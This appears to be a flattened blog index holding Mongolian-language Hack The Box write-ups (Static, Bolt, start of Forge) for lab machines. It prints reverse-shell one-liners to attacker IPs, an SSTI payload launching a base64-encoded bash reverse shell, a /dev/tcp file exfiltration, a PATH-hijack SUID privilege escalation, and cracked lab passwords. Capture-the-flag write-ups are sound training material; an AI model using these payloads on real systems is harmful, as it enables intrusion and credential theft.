Нэгтгэж аваад нэг dir дотор оруулсан.\ntotal 780 drwxr-xr-x 1 ca4mi ca4mi 72 Nov 8 06:11 . drwxr-xr-x 1 ca4mi ca4mi 26 Nov 8 06:07 .. -rw-r--r-- 1 ca4mi ca4mi 349 Nov 8 06:05 dedsec.py -rw-r--r-- 1 ca4mi ca4mi 4280 Nov 8 06:02 exploit.py -rw------- 1 ca4mi ca4mi 1675 Nov 8 06:11 id_rsa_www-data -rw-r--r-- 1 ca4mi ca4mi 779832 Nov 8 06:06 n scp: Тэгээд scp-р файлуудаа хуулсан.\nscp -P 2222 -i id_rsa_www-data nc www-data@10.10.10.246:/tmp/nc scp -P 2222 -i id_rsa_www-data exploit.py www-data@10.10.10.246:/tmp/exploit.py scp -P 2222 -i id_rsa_www-data dedsec.py www-data@10.10.10.246:/tmp/dedsec.py nc run: bin шинээр ажилууллж байгаа тул chmod +x хийнэ.\nwww-data@web:/tmp$ chmod +x nc www-data@web:/tmp$ ./nc -lvnp 9001 listening on [any] 9001 ... exploit.py ажилуулбал:\npython3 exploit.py --url [http://192.168.254.3/index.php](http://192.168.254.3/index.php) Хэвийн байлаа:\nwww-data@web:/tmp$ python3 exploit.py --url http://192.168.254.3/index.php [*] QSL candidate: 1754, 1759, 1764 [*] Target seems vulnerable (QSL:1754/HVL:220): PHPSESSID=a4632a83f8ca8a3690e01fc3cf1e1e19; path=/ [*] RCE successfully exploited! You should be able to run commands using: curl http://192.168.254.3/index.php?a=bin/ls+/ Бэлэн кодоо ажилууллах.\npython3 dedsec.py Энэ өөр таб дээр порт сонсож байгаад pki орж байгаа log:\nlistening on [any] 9001 ... connect to [192.168.254.2] from (UNKNOWN) [192.168.254.3] 41604 www-data@pki:~/html$ ls ls index.php uploads www-data@pki:~/html$ Ersatool - access шалгах:\nls -al /usr/bin/ersatool -rwxr-xr-x 1 root root 22496 Jun 21 17:05 /usr/bin/ersatoo ersatool - г ажилуулж болох эсэх:\nfind / -name ersatool.* 2\u0026gt;/dev/null /usr/src/ersatool.c http сервер асаах:\npython3 -m http.server 1337 PSPY ажилууллах, wget, curl байхгүй болохоор өөр арга: Bash script -г www-data@pki-с бичнэ:\n1\nfunction __curl() { read proto server path \u0026lt;\u0026lt;\u0026lt;$(echo ${1//// }) DOC=/${path// //} HOST=${server//:*} PORT=${server//*:} [[ x\u0026#34;${HOST}\u0026#34; == x\u0026#34;${PORT}\u0026#34; ]] \u0026amp;\u0026amp; PORT=80exec **3**\u0026lt;\u0026gt;/dev/tcp/${HOST}/$PORT echo -en \u0026#34;GET ${DOC} HTTP/1.0\\r\\nHost: ${HOST}\\r\\n\\r\\n\u0026#34; \u0026gt;**\u0026amp;3** (while read line; do [[ \u0026#34;$line\u0026#34; == $\u0026#39;\\r\u0026#39; ]] \u0026amp;\u0026amp; break done \u0026amp;\u0026amp; cat) \u0026lt;**\u0026amp;3** exec **3**\u0026gt;\u0026amp;- } 2\n__curl http://192.168.254.2:1337/pspy \u0026gt; pspy хуулах:\nscp -P 2222 -i id_rsa_www-data pspy64s www-data@10.10.10.246:/tmp/pspy pspy ажилуулах:\nwww-data@pki:/tmp/www$ chmod +x pspy www-data@pki:/tmp/www$ ./pspy | tee log pspy ажилуулаад ersatool (create, a,b print, exit..) юу хийж байгааг харсан. Хоёр REV SHELL хэрэгтэй болсон:\nwww-data@pki:/tmp/www$ chmod +x pspy www-data@pki:/tmp/www$ ./pspy pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855 ██▓███ ██████ ██▓███ ▓██ ██▓ ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒ ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░ ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░ ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░ ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒ ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░ ░░ ░ ░ ░ ░░ ▒ ▒ ░░ ░ ░ ░ ░ ░Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done 2021/06/25 02:46:00 CMD: UID=0 PID=9 | nginx: master process nginx 2021/06/25 02:46:00 CMD: UID=0 PID=7 | /bin/bash /entry.sh 2021/06/25 02:46:00 CMD: UID=33 PID=542 | php-fpm: pool www 2021/06/25 02:46:00 CMD: UID=33 PID=541 | php-fpm: pool www 2021/06/25 02:46:00 CMD: UID=33 PID=540 | php-fpm: pool www 2021/06/25 02:46:00 CMD: UID=33 PID=539 | php-fpm: pool www 2021/06/25 02:46:00 CMD: UID=33 PID=538 | php-fpm: pool www 2021/06/25 02:46:00 CMD: UID=33 PID=1950 | ./pspy 2021/06/25 02:46:00 CMD: UID=33 PID=1935 | /bin/bash 2021/06/25 02:46:00 CMD: UID=33 PID=1934 | python3 -c import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;) 2021/06/25 02:46:00 CMD: UID=33 PID=1931 | /bin/bash 2021/06/25 02:46:00 CMD: UID=33 PID=1930 | python3 -c import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;) 2021/06/25 02:46:00 CMD: UID=33 PID=1927 | /bin/bash 2021/06/25 02:46:00 CMD: UID=33 PID=1926 | //usr/bin/python3.6 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.254.2\u0026#34;,9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;) 2021/06/25 02:46:00 CMD: UID=33 PID=1925 | sh -c //usr/bin/python3.6 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.254.2\u0026#34;,9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 2021/06/25 02:46:00 CMD: UID=33 PID=1921 | /bin/bash 2021/06/25 02:46:00 CMD: UID=33 PID=1920 | //usr/bin/python3.6 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.254.2\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;) 2021/06/25 02:46:00 CMD: UID=33 PID=1919 | sh -c //usr/bin/python3.6 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.254.2\u0026#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; 2021/06/25 02:46:00 CMD: UID=0 PID=12 | php-fpm: master process (/usr/local/etc/php-fpm.conf) 2021/06/25 02:46:00 CMD: UID=33 PID=11 | nginx: worker process 2021/06/25 02:46:00 CMD: UID=33 PID=10 | nginx: worker process 2021/06/25 02:46:00 CMD: UID=0 PID=1 | /bin/sh -c /entry.sh 2021/06/25 02:46:03 CMD: UID=33 PID=1959 | /usr/bin/ersatool 2021/06/25 02:46:35 CMD: UID=0 PID=1961 | sh -c /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1960 | /usr/bin/ersatool 2021/06/25 02:46:35 CMD: UID=0 PID=1962 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1963 | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`ChangeMe`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf 2021/06/25 02:46:35 CMD: UID=0 PID=1964 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1965 | openssl version 2021/06/25 02:46:35 CMD: UID=0 PID=1966 | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`a`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf 2021/06/25 02:46:35 CMD: UID=0 PID=1967 | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`a`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf 2021/06/25 02:46:35 CMD: UID=0 PID=1968 | mktemp /opt/easyrsa/pki/private/a.key.XXXXXXXXXX 2021/06/25 02:46:35 CMD: UID=0 PID=1969 | mktemp /opt/easyrsa/pki/reqs/a.req.XXXXXXXXXX 2021/06/25 02:46:35 CMD: UID=0 PID=1970 | openssl req -utf8 -new -newkey rsa:2048 -config /opt/easyrsa/pki/safessl-easyrsa.cnf -keyout /opt/easyrsa/pki/private/a.key.HZbmrNjLDK -out /opt/easyrsa/pki/reqs/a.req.BOyXzgidnO -nodes -batch 2021/06/25 02:46:35 CMD: UID=0 PID=1971 | 2021/06/25 02:46:35 CMD: UID=0 PID=1972 | mv /opt/easyrsa/pki/reqs/a.req.BOyXzgidnO /opt/easyrsa/pki/reqs/a.req 2021/06/25 02:46:35 CMD: UID=0 PID=1973 | openssl rand -hex -out /opt/easyrsa/pki/serial 16 2021/06/25 02:46:35 CMD: UID=0 PID=1974 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1975 | openssl ca -config /opt/easyrsa/pki/openssl-easyrsa.cnf -status 2243a379dfbe067da1fa206727f760b3 2021/06/25 02:46:35 CMD: UID=0 PID=1976 | sed -e s`ENV::EASYRSA`EASYRSA`g -e s`$dir`/opt/easyrsa/pki`g -e s`$EASYRSA_PKI`/opt/easyrsa/pki`g -e s`$EASYRSA_CERT_EXPIRE`36500`g -e s`$EASYRSA_CRL_DAYS`180`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_KEY_SIZE`2048`g -e s`$EASYRSA_DIGEST`sha256`g -e s`$EASYRSA_DN`cn_only`g -e s`$EASYRSA_REQ_COUNTRY`US`g -e s`$EASYRSA_REQ_PROVINCE`California`g -e s`$EASYRSA_REQ_CITY`San Francisco`g -e s`$EASYRSA_REQ_ORG`Copyleft Certificate Co`g -e s`$EASYRSA_REQ_OU`My Organizational Unit`g -e s`$EASYRSA_REQ_CN`a`g -e s`$EASYRSA_REQ_EMAIL`me@example.net`g /opt/easyrsa/pki/openssl-easyrsa.cnf 2021/06/25 02:46:35 CMD: UID=0 PID=1977 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1979 | openssl req -in /opt/easyrsa/pki/reqs/a.req -noout -subject -nameopt multiline 2021/06/25 02:46:35 CMD: UID=0 PID=1978 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1980 | cat /opt/easyrsa/x509-types/COMMON 2021/06/25 02:46:35 CMD: UID=0 PID=1983 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1984 | awk BEGIN {IGNORECASE=1; r=2} { if(match($0,\u0026#34;no\u0026#34;)) {r=1; exit} if(match($0,\u0026#34;yes\u0026#34;)) {r=0; exit} } END {exit r} 2021/06/25 02:46:35 CMD: UID=0 PID=1985 | /bin/sh /opt/easyrsa/easyrsa build-client-full a nopass batch 2021/06/25 02:46:35 CMD: UID=0 PID=1987 | openssl ca -utf8 -in /opt/easyrsa/pki/reqs/a.req -out /opt/easyrsa/pki/issued/a.crt.hgNfbGlQKY -config /opt/easyrsa/pki/safessl-easyrsa.cnf -extfile /opt/easyrsa/pki/extensions.temp -days 36500 -batch 2021/06/25 02:46:35 CMD: UID=0 PID=1988 | mv /opt/easyrsa/pki/issued/a.crt.hgNfbGlQKY /opt/easyrsa/pki/issued/a.crt Openssl -г compile хийх болгондоо root access ашиглаад байсан юм шиг байгаа. Тэгээд openssl -г root рүү ороход trigger болгож ашиглахад зориулж /bin/bash бэлдэж өгөөд -p -г ашиглаад /root - dir рүү хандаж болгох.\nopenssl нэртэй файл үүсгээд дотор нь:\n**#!/bin/bash** chmod u+s /bin/bash base64 рүү:\n┌─[ca4mi@ca4mi-virtualbox]─[~/Documents/htb/machine/static/www/cheat] └──╼ $cat openssl | base64 IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo= pki дотор decode хийнэ\necho \u0026#34;IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=\u0026#34; | base64 -d \u0026gt; openssl cat openssl #!/bin/bash chmod u+s /bin/bash Permission нэмэх:\nchmod 755 openssl Path үүсгээд дотор openssl хийгээд доор байгааг ажилуулна:\nexport PATH=/tmp/pwn:$PATH echo $PATH /tmp/pwn:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin Ersatool ажилууллахаар usr/bin/spin давхар ажиллаж байгааг ашиглах. Тэгээд create, delete, a, b, c гээд үүсгэж байгаад доор /bin/bash -н permission suid болж байгааг ажилгана.\nwww-data@pki:/tmp/pwn$ ls -al /bin/bash -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash www-data@pki:/tmp/pwn$ /bin/bash -p bash-4.4# cd /root/ bash-4.4# ls notes.txt root.txt ","permalink":"https://cadil.github.io/posts/2024-02-22-htb-static-writeup/","summary":"PS: Үүсгэсэн огноо: 2021 оны 11-р сарын 6~9 өдрүүдэд бичсэн тэмдэглэл юм.\n1. IP Address # Machine Address 10.10.10.246 # Local Address 10.10.14.22 2. Nmap sudo nmap -sC -sV -oA nmap/static 10.10.10.246 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 00:31 EDT Nmap scan report for 10.10.10.246 Host is up (0.21s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA) | 256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA) |_ 256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519) 2222/tcp open ssh OpenSSH 7.","title":"HTB - Static"},{"content":"1. IP Address # Machine Address 10.10.11.114 # Local Address 10.10.14.50 2. Nmap # Nmap 7.91 scan initiated Thu Nov 4 00:16:52 2021 as: nmap -sC -sV -oA nmap/bolt 10.10.11.114 Nmap scan report for 10.10.11.114 Host is up (0.51s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Starter Website - About 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | http-title: Passbolt | Open source password manager for teams |_Requested resource was /auth/login?redirect=%2F | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Nov 4 00:17:28 2021 -- 1 IP address (1 host up) scanned in 36.27 seconds 3. Gobuster gobuster dir -u http://10.10.11.114 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out /login (Status: 200) [Size: 9287] /index (Status: 308) [Size: 247] [--\u0026gt; http://10.10.11.114/] /register (Status: 200) [Size: 11038] /contact (Status: 200) [Size: 26293] /download (Status: 200) [Size: 18570] /profile (Status: 500) [Size: 290] /logout (Status: 302) [Size: 209] [--\u0026gt; http://10.10.11.114/] /services (Status: 200) [Size: 22443] /pricing (Status: 200) [Size: 31731] /sign-in (Status: 200) [Size: 9287] /sign-up (Status: 200) [Size: 11038] хэрэг болох зүйл олдсонгүй.\nGobuster with VHOST\ngobuster vhost dir -u http://10.10.11.114 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_vhost.out Vhost -р хайж үзвэл илэрц олдсонгүй:\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.114 [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/11/13 08:14:13 Starting gobuster in VHOST enumeration mode =============================================================== =============================================================== 2021/11/13 09:04:24 Finished =============================================================== 4. ffuf ffuf -u 10.10.10.250/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt Output:\n________________________________________________ :: Method : GET :: URL : http://10.10.11.114/FUZZ :: Wordlist : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt :: Output file : fuff.out :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ login [Status: 200, Size: 9287, Words: 2135, Lines: 173] register [Status: 200, Size: 11038, Words: 3053, Lines: 199] contact [Status: 200, Size: 26293, Words: 10060, Lines: 468] download [Status: 200, Size: 18570, Words: 5374, Lines: 346] logout [Status: 302, Size: 209, Words: 22, Lines: 4] services [Status: 200, Size: 22443, Words: 7170, Lines: 405] pricing [Status: 200, Size: 31731, Words: 11055, Lines: 549] sign-in [Status: 200, Size: 9287, Words: 2135, Lines: 173] sign-up [Status: 200, Size: 11038, Words: 3053, Lines: 199] check-email [Status: 200, Size: 7331, Words: 1224, Lines: 147] :: Progress: [43003/43003] :: Job [1/1] :: 162 req/sec :: Duration: [0:04:31] :: Errors: 0 :: check-email хаяг байна. Орохоор: http://10.10.11.114/check-email\nBurp:\nPOST /register HTTP/1.1 Host: 10.10.11.114 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 52 Origin: http://10.10.11.114 DNT: 1 Connection: close Referer: http://10.10.11.114/register Upgrade-Insecure-Requests: 1 Sec-GPC: 1 username=ca4mi\u0026amp;email=ca4mi%40mail.com\u0026amp;password=ca4mi GET /auth/login?redirect=%2F HTTP/2 Host: 10.10.11.114 Cookie: passbolt_session=32q4d8uhp91s8j1nq7p79qprp7; csrfToken=55812a799be2316e0d4af2e41bc4793889c05b6e178787be229a78a9320d5bb317d53e6d70ce9ddca41ee337b5650ce8d36926445447873d30dc06d62adcecb7 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Dnt: 1 Upgrade-Insecure-Requests: 1 Sec-Gpc: 1 Cache-Control: max-age=0 Te: trailers Connection: close 5. Image tar tar -xvf image.tar tar: This does not look like a tar archive tar: Exiting with failure status due to previous errors адлаа загаад, дахин татаж үзсэн. Болсон\nsql Hash password энэ дотроос олоод crack хийх хэрэгтэй. Crack хийхэд хугацаа орон гэж бодоод (хэдийн) encrypt хийсэн нууц үг ашиглав. admin:deadbolt\nEddie demo.bolt.htb/register mail.bolt.htb\nInvite code:\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py invite_code XNSS-HSJW-3NGU-8XTJ\nSSTI demo - гоор ороод user үүсгэнэ. Үүсгэсэн user-н нэрийг settings хэсгээс:\n{% with a = request[\u0026#34;application\u0026#34;][\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5fimport\\x5f\\x5f\u0026#34;](\u0026#34;os\u0026#34;)[\u0026#34;popen\u0026#34;](\u0026#34;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNi85MDAxIDA+JjEK | base64 -d | bash\u0026#34;)[\u0026#34;read\u0026#34;]() %} a {% endwith %} болгож өөрчлөөд nc асаан mail.bolt.htb нэвтэрч орон баталгаажуулах мэйлийг дараад shell-р орно.\n/etc/passbolt/passbolt.php /var/mail/eddie eddie@bolt:~$ cat /var/mail/eddie From clark@bolt.htb Thu Feb 25 14:20:19 2021 Return-Path: \u0026lt;clark@bolt.htb\u0026gt; X-Original-To: eddie@bolt.htb Delivered-To: eddie@bolt.htb Received: by bolt.htb (Postfix, from userid 1001) id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST) Subject: Important! To: \u0026lt;eddie@bolt.htb\u0026gt; X-Mailer: mail (GNU Mailutils 3.7) Message-Id: \u0026lt;20210225212019.DFF264CD@bolt.htb\u0026gt; Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST) From: Clark Griswold \u0026lt;clark@bolt.htb\u0026gt; Hey Eddie, The password management server is up and running. Go ahead and download the extension to your browser and get logged in. Be sure to back up your private key because I CANNOT recover it. Your private key is the only way to recover your account. Once you\u0026#39;re set up you can start importing your passwords. Please be sure to keep good security in mind - there\u0026#39;s a few things I read about in a security whitepaper that are a little concerning... -Clark eddie\u0026rsquo;s password: rT2;jW7\u0026lt;eY8!dX8}pQ8%\nuser.txt\n528abe******* eddie ssh:\ngrep -iR \u0026#34;BEGIN PGP\u0026#34; grep -iR \u0026#34;PRIVATE KEY\u0026#34; john is required\netc/hosts\npassbolt.bolt.htb /home/eddie/.gnupg/openpgp-revocs.d/eddie.key .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log 003.log файл локал машин руу хуулах: local\nnc -lvnp 9001 \u0026gt; 0003.log machine\ncat /home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log \u0026gt; /dev/tcp/10.10.14.50/9001 Хуулсан log-г vim-р орон filter ашиглахад хэрэглэх value: :%s/\\\\\\\\r\\\\\\\\n/\\r/g\nrockyou value:\njohn --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg private_key.txt eddie-с:\nsu root Passwrod:\n(2rmxsNW(Z?3=p/9s ","permalink":"https://cadil.github.io/posts/2024-02-21-htb-bolt-writeup/","summary":"1. IP Address # Machine Address 10.10.11.114 # Local Address 10.10.14.50 2. Nmap # Nmap 7.91 scan initiated Thu Nov 4 00:16:52 2021 as: nmap -sC -sV -oA nmap/bolt 10.10.11.114 Nmap scan report for 10.10.11.114 Host is up (0.51s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.","title":"HTB - Bolt"},{"content":"1. IP Address # Machine Address 10.10.11.111 # Local Address 10.10.14.12 2. Nmap sudo nmap -sC -sV -oA nmap/forge 10.10.11.111 Output:\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-30 22:18 EDT Nmap scan report for forge.htb (10.10.11.111) Host is up (0.22s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Gallery Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.36 seconds Bionic -\u0026gt; 4ubuntu0.3\n3. Gobuster Хэрэгтэй path байгаагүй:\n/uploads (Status: 301) [Size: 224] [--\u0026gt; http://forge.htb/uploads/] /upload (Status: 200) [Size: 929] /static (Status: 301) [Size: 307] [--\u0026gt; http://forge.htb/static/] /. (Status: 200) [Size: 2050] /server-status (Status: 403) [Size: 274] 4. ffuf ffuf -w /opt/SecLists/Discovery/DNS/shubs-subdomains.txt -u http://forge.htb/ -H \u0026#34;Host: FUZZ.forge.htb\u0026#34; -t 200 -fl 10 admin.forge.htb:\nOnly localhost is allowed! 5. URL Upload http://forge.htb/uploads/Mx21C8lAyzi9AyygJDeW\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Admin Portal\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;/static/css/main.css\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;h1 class=\u0026#34;\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;Portal home\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\u0026#34;align-right margin-right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;/announcements\u0026#34;\u0026gt;Announcements\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\u0026#34;align-right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;/upload\u0026#34;\u0026gt;Upload image\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; 